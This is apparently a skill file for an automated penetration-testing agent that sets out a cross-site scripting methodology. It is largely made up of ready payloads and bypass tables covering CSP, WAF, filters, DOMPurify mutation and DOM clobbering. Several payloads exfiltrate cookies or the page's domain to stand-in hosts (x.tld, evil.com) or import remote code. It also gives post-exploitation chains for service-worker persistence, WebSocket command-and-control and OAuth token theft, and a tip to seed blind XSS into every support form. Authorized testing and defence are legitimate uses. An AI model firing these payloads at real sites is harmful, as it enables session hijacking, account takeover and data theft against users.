---
name: xss
description: XSS testing covering reflected, stored, and DOM-based vectors with CSP bypass techniques
depends_on: []
---

# XSS

Cross-site scripting persists because context, parser, and framework edges are complex. Treat every user-influenced string as untrusted until it is strictly encoded for the exact sink and guarded by runtime policy (CSP/Trusted Types).

## Discovery Signals

Technology fingerprints that indicate XSS probability. Prioritize testing when these appear.

| Signal | Where to Find | Why Vulnerable |
|---|---|---|
| AngularJS 1.x (`ng-app`, `angular.min.js`) | Page source, JS includes | Template injection: `{{constructor.constructor('alert(1)')()}}` bypasses sandbox |
| Markdown renderer without HTML filter | Feature scan (comments, wikis, docs) | Raw HTML passthrough in markdown = stored XSS |
| WYSIWYG editor (TinyMCE, CKEditor, Froala) | Feature scan | Custom handler bypass, paste event injection |
| Server-side PDF/image renderer (wkhtmltopdf, Puppeteer) | Feature scan, response headers | JS execution in headless context = SSRF + data exfil |
| JSONP endpoint (`?callback=`) | API scan | `<script src="//target/api?callback=alert">` bypasses CSP |
| `window.postMessage` without origin check | JS source analysis | DOM XSS via cross-origin message injection |
| React `dangerouslySetInnerHTML` in source | JS bundle analysis | Direct innerHTML without sanitization |
| Open Graph / link preview rendering | Feature scan | Server fetches + renders attacker-controlled meta tags |
| User-uploaded SVG served inline | Upload feature | SVG with onload/animate events = stored XSS |
| WebSocket message reflected to DOM | WebSocket traffic | DOM XSS via WebSocket injection |
| Custom error pages with reflection | 404/500 error pages | Reflected parameter in error template |
| AMP pages | Page source | AMP HTML allows `amp-bind` expressions |

## Attack Surface

**Types**
- Reflected, stored, and DOM-based XSS across web/mobile/desktop shells

**Contexts**
- HTML, attribute, URL, JS, CSS, SVG/MathML, Markdown, PDF

**Frameworks**
- React/Vue/Angular/Svelte sinks, template engines, SSR/ISR

**Defenses to Bypass**
- CSP/Trusted Types, DOMPurify, framework auto-escaping

## Injection Points

**Server Render**
- Templates (Jinja/EJS/Handlebars), SSR frameworks, email/PDF renderers

**Client Render**
- `innerHTML`/`outerHTML`/`insertAdjacentHTML`, template literals
- `dangerouslySetInnerHTML`, `v-html`, `$sce.trustAsHtml`, Svelte `{@html}`

**URL/DOM**
- `location.hash`/`search`, `document.referrer`, base href, `data-*` attributes

**Events/Handlers**
- `onerror`/`onload`/`onfocus`/`onclick` and `javascript:` URL handlers

**Cross-Context**
- postMessage payloads, WebSocket messages, local/sessionStorage, IndexedDB

**File/Metadata**
- Image/SVG/XML names and EXIF, office documents processed server/client

## Context Encoding Rules

- **HTML text**: encode `< > & " '`
- **Attribute value**: encode `" ' < > &` and ensure attribute quoted; avoid unquoted attributes
- **URL/JS URL**: encode and validate scheme (allowlist https/mailto/tel); disallow javascript/data
- **JS string**: escape quotes, backslashes, newlines; prefer `JSON.stringify`
- **CSS**: avoid injecting into style; sanitize property names/values; beware `url()` and `expression()`
- **SVG/MathML**: treat as active content; many tags execute via onload or animation events

## Key Vulnerabilities

### DOM XSS

**Sources**
- `location.*` (hash/search), `document.referrer`, postMessage, storage, service worker messages

**Sinks**
- `innerHTML`/`outerHTML`/`insertAdjacentHTML`, `document.write`
- `setAttribute`, `setTimeout`/`setInterval` with strings
- `eval`/`Function`, `new Worker` with blob URLs

**Vulnerable Pattern**
```javascript
const q = new URLSearchParams(location.search).get('q');
results.innerHTML = `<li>${q}</li>`;
```
Exploit: `?q=<img src=x onerror=fetch('//x.tld/'+document.domain)>`

### DOM Clobbering

Use HTML elements with `id` or `name` attributes to overwrite global JS variables, enabling XSS when code trusts `window.xxx` without null checks.

```html
<!-- Clobber window.config -->
<form id="config"><input name="apiUrl" value="//evil.com"></form>
<!-- Now window.config.apiUrl === "//evil.com" -->
```

Key patterns:
- `<a id="xxx" href="evil">` clobbers `window.xxx` with HTMLAnchorElement (toString = href)
- `<form id="xxx"><input name="yyy">` clobbers `window.xxx.yyy`
- Clobber `defaultView`, `ownerDocument`, DOMPurify internal refs
- DOMPurify bypass via clobbering: `<form id="DOMPurify"><input name="removed">` (older versions)
- Any library reading `window.config` / `window.settings` without `typeof` guard is vulnerable

### Mutation XSS

Leverage parser repairs to morph safe-looking markup into executable code:

| Parser Quirk | Payload | Why It Works |
|---|---|---|
| `<noscript>` context switch | `<noscript><p title="</noscript><img src=x onerror=alert(1)>` | Browser enables scripts, noscript content parsed differently |
| `<math>` namespace confusion | `<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>` | Math namespace escapes sanitizer tree |
| `<svg><foreignObject>` | `<svg><foreignObject><body><img src=x onerror=alert(1)>` | Namespace switch bypasses element allowlists |
| `<form>` formaction | `<form><button formaction=javascript:alert(1)>click` | formaction accepts javascript: URI |
| Comment breakout | `<!--<img src="--><img src=x onerror=alert(1)//">` | Comment boundary disagreement between parser and sanitizer |

### Template Injection

Server or client templates evaluating expressions (AngularJS legacy, Handlebars helpers, lodash templates):
```
{{constructor.constructor('fetch(`//x.tld?c=`+document.cookie)')()}}
```

### CSP Bypass

| CSP Directive | Bypass Technique | Condition |
|---|---|---|
| `script-src 'self'` | Upload JS file to same origin (SVG/JS polyglot) | File upload exists |
| `script-src 'self'` | JSONP endpoint on same origin: `<script src="/api?callback=alert(1)">` | JSONP exists |
| `script-src *.cdn.com` | Find XSS on any `cdn.com` subdomain | Wildcard CDN |
| `script-src 'nonce-xxx'` | Nonce reuse across pages, nonce leaked in meta tag | Predictable nonce |
| `script-src 'unsafe-eval'` | `eval()`, `Function()`, `setTimeout('string')` all work | Common in legacy apps |
| `default-src 'self'` without `script-src` | Falls back to default = `'self'` for scripts | Missing directive |
| `base-uri` not set | `<base href="//evil.com">` hijacks relative script URLs | No base-uri directive |
| `script-src` with `data:` | `<script src="data:text/javascript,alert(1)">` | Rare but occurs |
| `script-src` with Angular | Angular expression: `{{constructor.constructor('alert(1)')()}}` | Angular + unsafe-eval |
| `object-src` not set | `<object data="data:text/html,<script>alert(1)</script>">` | Missing object-src |
| `script-src` allows Google domains | Google Apps Script / reCAPTCHA callback gadgets | google.com allowed |
| Any CSP | `<meta http-equiv="refresh" content="0;url=javascript:alert(1)">` | Old browsers only |

### Trusted Types Bypass

- Custom policies returning unsanitized strings; abuse policy whitelists
- Sinks not covered by Trusted Types (CSS, URL handlers) and pivot via gadgets

## WAF Evasion

| WAF Behavior | Evasion Technique |
|---|---|
| Strips `<script>` tag | Event handlers: `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>` |
| Blocks `alert` | `prompt`, `confirm`, `print`, `top['al'+'ert'](1)`, `self[atob('YWxlcnQ=')](1)` |
| Blocks `onerror` | `onfocus`+`autofocus`, `onmouseover`, `ontoggle`+`<details open>`, `onanimationend` |
| Blocks `(` and `)` | Tagged template literals: `` alert`1` ``, `onerror=alert&#40;1&#41;` |
| Strips on `<` or `>` | Double encoding `%253C`, Unicode fullwidth: `＜script＞`, null byte: `<scr%00ipt>` |
| Blocks `javascript:` in href | Tab injection: `java\tscript:alert(1)`, `javascript:/**/alert(1)` |
| Strips `//` comments | `/**/` block comments, `/\` (backslash) |
| URL-based WAF | Chunked transfer encoding, parameter pollution, header injection |

## Filter Bypass

| Filter | Bypass |
|---|---|
| Strips `<script>` | `<sCrIpT>`, `<scr<script>ipt>`, `<script/src=data:,alert(1)>` |
| Blocks `on` event handlers | `onpointerrawupdate`, `onbeforetoggle` (newer events not in blocklist) |
| Strips `.` in JS | `document['cookie']` bracket notation, `self['loca'+'tion']` |
| Blocks `document.cookie` | `navigator.sendBeacon(url,document['cookie'])`, `fetch` with FormData |
| HTML entity decode | Double encoding, mixed decimal+hex entities |
| Length limit (<100 chars) | `<svg/onload=import('//x.co/j')>` (28 chars with external payload) |
| Blocklist-based sanitizer | Rare valid elements: `<details/open/ontoggle=alert(1)>`, `<dialog open onclose=alert(1)>` |

## Polyglot Payloads

Keep a compact set tuned per context:
- **HTML node**: `<svg onload=alert(1)>`
- **Attr quoted**: `" autofocus onfocus=alert(1) x="`
- **Attr unquoted**: `onmouseover=alert(1)`
- **JS string**: `"-alert(1)-"`
- **URL**: `javascript:alert(1)`

## Framework-Specific

### React

- Primary sink: `dangerouslySetInnerHTML`
- Secondary: setting event handlers or URLs from untrusted input
- Bypass patterns: unsanitized HTML through libraries; custom renderers using innerHTML

### Vue

- Sinks: `v-html` and dynamic attribute bindings
- SSR hydration mismatches can re-interpret content

### Angular

- Legacy expression injection (pre-1.6)
- `$sce` trust APIs misused to whitelist attacker content

### Svelte

- Sinks: `{@html}` and dynamic attributes

### Markdown/Richtext

- Renderers often allow HTML passthrough; plugins may re-enable raw HTML
- Sanitize post-render; forbid inline HTML or restrict to safe whitelist

## Special Contexts

### Email

- Most clients strip scripts but allow CSS/remote content
- Use CSS/URL tricks only if relevant; avoid assuming JS execution

### PDF and Docs

- PDF engines may execute JS in annotations or links
- Test `javascript:` in links and submit actions

### File Uploads

- SVG/HTML uploads served with `text/html` or `image/svg+xml` can execute inline
- Verify content-type and `Content-Disposition: attachment`
- Mixed MIME and sniffing bypasses; ensure `X-Content-Type-Options: nosniff`

## Stored XSS Vectors

Corpus-proven stored XSS injection points beyond standard form fields:

- **File name**: Upload file named `"><img src=x onerror=alert(1)>.png` -- filename reflected in download UI
- **SVG upload**: SVG with `<script>` or `onload` served as `image/svg+xml` inline
- **Markdown injection**: `[link](javascript:alert(1))` or raw HTML in markdown renderers
- **Email template injection**: User-controlled fields in notification emails rendered as HTML
- **CSV injection**: `=cmd|' /C calc'!A0` in export -- Excel formula injection (not XSS but related)
- **EXIF metadata**: Image EXIF comment field containing XSS payload, reflected in admin/gallery views
- **Calendar (ICS)**: Event title/description with HTML reflected in web calendar UI
- **Chat/messaging**: Rich text paste handler allowing script injection
- **Code comments/PR descriptions**: Markdown rendered without sanitization
- **Open Graph preview**: Attacker-controlled og:title/og:description cached and rendered in link previews

## Post-Exploitation

- Session/token exfiltration: prefer fetch/XHR over image beacons for reliability
- Real-time control: WebSocket C2 with strict command set
- Persistence: service worker registration; localStorage/script gadget re-injection
- Impact: role hijack, CSRF chaining, internal port scan via fetch, credential phishing overlays

### Chain Patterns

- XSS -> Service Worker registration -> persistent access (survives logout, cookie rotation)
- XSS -> postMessage to parent frame -> escalate to parent domain
- XSS -> WebSocket hijack -> real-time account control
- XSS -> CSRF bypass -> admin account creation -> persistent backdoor
- Self-XSS -> Login CSRF -> force victim into attacker session -> XSS fires on victim
- XSS -> OAuth token theft -> access linked services beyond the vulnerable app
- XSS -> DOM read of anti-CSRF token -> arbitrary state-changing requests

## Testing Methodology

1. **Identify sources** - URL/query/hash/referrer, postMessage, storage, WebSocket, server JSON
2. **Trace to sinks** - Map data flow from source to sink
3. **Classify context** - HTML node, attribute, URL, script block, event handler, JS eval-like, CSS, SVG
4. **Assess defenses** - Output encoding, sanitizer, CSP, Trusted Types, DOMPurify config
5. **Craft payloads** - Minimal payloads per context with encoding/whitespace/casing variants
6. **Multi-channel** - Test across REST, GraphQL, WebSocket, SSE, service workers

## Reflection via Proxy/Fetch Endpoints (often missed)

Any endpoint that ACCEPTS a URL parameter and echoes the fetched body (or fetched metadata) back in its response is a reflected-XSS primitive -- even when the target itself never reflects user input directly. Pattern:

```
GET <proxy-endpoint>?url=<attacker-site>       -> server returns attacker-site's body
GET <fetch-endpoint>?target=<attacker-site>    -> same
GET <preview-endpoint>?link=<attacker-site>    -> open-graph preview with title + description reflected
```
(The endpoint names vary by target -- `/proxy`, `/api/fetch-url`, `/api/preview`, `/v1/linkPreview`, `/import`, `/webhook/verify`, etc. Enumerate any endpoint that accepts a URL parameter.)

**Test procedure**:
1. Enumerate URL-accepting endpoints (parameter names: `url`, `link`, `target`, `src`, `fetch`, `proxy`, `preview`, `feed`, `import`, `source`, `webhook`). List also covers SSRF -- one endpoint can be both.
2. For each, point to a server YOU control serving:
   - `<html><body><script>alert(1)</script></body></html>` (reflects script tag)
   - `<html><meta property="og:title" content="<script>alert(1)</script>"></html>` (reflects via open-graph parsers)
   - A file with `<svg onload=alert(1)>` served with `Content-Type: image/svg+xml`
3. Check the proxy/fetch endpoint's response:
   - Is the body returned verbatim? -> reflected XSS
   - Is a preview extracted and re-rendered? -> stored-in-response XSS if cached
   - Is Content-Type preserved from upstream? -> attacker controls mime type, stored-XSS primitive
4. Variant: if direct body isn't echoed, check if the endpoint surfaces error messages including the upstream response. Crafted error-in-body-that-reflects-upstream-content = same primitive.

Also run this against: `/api/import`, `/api/webhook/test`, `/api/redirect/check`, `/api/screenshot`, any PDF/image renderer.

## Persistence & Retry Discipline (MANDATORY)

Never mark a reflection point "not XSS-injectable" after 1-2 payloads. A sanitized `<script>` does not mean safe -- it means THAT tag is filtered. Context-appropriate variants, encoding, and mutation are where live XSS hides.

**Per-context retry matrix**:

| Context | Primary payload | If filtered, try |
|---|---|---|
| HTML body | `<script>alert(1)</script>` | `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`, `<iframe srcdoc="<script>alert(1)</script>">`, `<details open ontoggle=alert(1)>`, `<video><source onerror=alert(1)>`, `<audio src=x onerror=alert(1)>` |
| HTML attribute (unquoted) | `a onfocus=alert(1) autofocus` | `onclick=alert(1)//`, close attr then break out `"><img src=x onerror=alert(1)>` |
| JS string literal | `';alert(1);//` | `\';alert(1);//`, `</script><script>alert(1)</script>`, `-prompt(1)-` |
| JS template literal `${...}` | `${alert(1)}` | Unicode bypass, `alert(1)` |
| URL in `href`/`src` | `javascript:alert(1)` | `data:text/html,<script>alert(1)</script>`, `javascript:/*--></title></style><svg onload=alert(1)>`, tab/newline bypasses `java\tscript:alert(1)` |
| CSS | `</style><script>alert(1)</script>` | `expression(alert(1))` (old IE), `url(javascript:alert(1))` |
| SVG-in-img | `<svg onload=alert(1)>` with `Content-Type: image/svg+xml` | Chained via file upload |
| JSON reflected in HTML | `",<script>alert(1)</script>"` (break out of JSON context) | Check if `</script>` closes surrounding block |

**Encoding variants** (try when primary fails):
- HTML entities: `&lt;script&gt;` -- check if decoded once (entity decode then render)
- Hex entities: `&#x3C;script&#x3E;`
- Decimal entities: `&#60;script&#62;`
- URL-encoded: `%3Cscript%3E`
- Double URL-encoded: `%253Cscript%253E`
- Unicode: `<script>` in JS context

**False-negative signals that need re-probe**:
- Response size identical but payload present -> check DOM via headless browser (sanitizer may strip silently)
- Content-Security-Policy present but `unsafe-inline` or `unsafe-eval` permitted -> still exploitable
- Tag stripped but events preserved -> `onerror` family still works
- Reflection only in `<meta>` / HTTP header -> response-splitting-into-XSS primitive

## Validation

1. Provide minimal payload and context (sink type) with before/after DOM or network evidence
2. Demonstrate cross-browser execution where relevant or explain parser-specific behavior
3. Show bypass of stated defenses (sanitizer settings, CSP/Trusted Types) with proof
4. Quantify impact beyond alert: data accessed, action performed, persistence achieved

## False Positives

- Reflected content safely encoded in the exact context
- CSP with nonces/hashes and no inline/event handlers
- Trusted Types enforced on sinks; DOMPurify in strict mode with URI allowlists
- Scriptable contexts disabled (no HTML pass-through, safe URL schemes enforced)

## Impact

- Session hijacking and credential theft
- Account takeover via token exfiltration
- CSRF chaining for state-changing actions
- Malware distribution and phishing
- Persistent compromise via service workers

## Pro Tips

1. Start with context classification, not payload brute force
2. Use DOM instrumentation to log sink usage; it reveals unexpected flows
3. Keep a small, curated payload set per context and iterate with encodings
4. Validate defenses by configuration inspection and negative tests
5. Prefer impact-driven PoCs (exfiltration, CSRF chain) over alert boxes
6. Treat SVG/MathML as first-class active content; test separately
7. Re-run tests under different transports and render paths (SSR vs CSR vs hydration)
8. Test CSP/Trusted Types as features: attempt to violate policy and record the violation reports
9. Seed blind XSS payloads into every support/contact/abuse form -- admin dashboard rendering fires weeks later ($500K bounties)
10. For mobile apps with WebViews, decompile and find `@JavascriptInterface`/`addJavascriptInterface` -- JS bridge methods callable from attacker-controlled page content are UXSS ($450K)
11. Map inter-property auth-token graphs on multi-property platforms (Google/Meta/Microsoft) -- XSS on property A can steal tokens that grant access to property B ($62.5K)
12. Audit HTML sanitizers for parser-mutation behavior: the sanitizer parses once, the browser re-parses differently -- focus on mutation, not tag removal ($750K)
13. Complex file-format upload XSS: for any app accepting DSPL, OOXML, KML, GeoJSON, ePub, OPML, or XML config uploads, read the format spec for embedded HTML/script fields -- parsers extract and render these sub-documents without sanitization, turning file upload into stored XSS ($13.3K, report 56191206)
14. `data-*` attribute JS sinks for CSP bypass: when CSP blocks inline scripts but allows attribute injection, enumerate JS that reads `data-*` attributes for fetch/eval/template operations -- injecting `data-url="javascript:..."` or `data-template="{{payload}}"` into an element whose JS consumer trusts the attribute value bypasses CSP without inline script ($13.9K, report 1731349)

## Summary

Context + sink decide execution. Encode for the exact context, verify at runtime with CSP/Trusted Types, and validate every alternative render path. Small payloads with strong evidence beat payload catalogs.
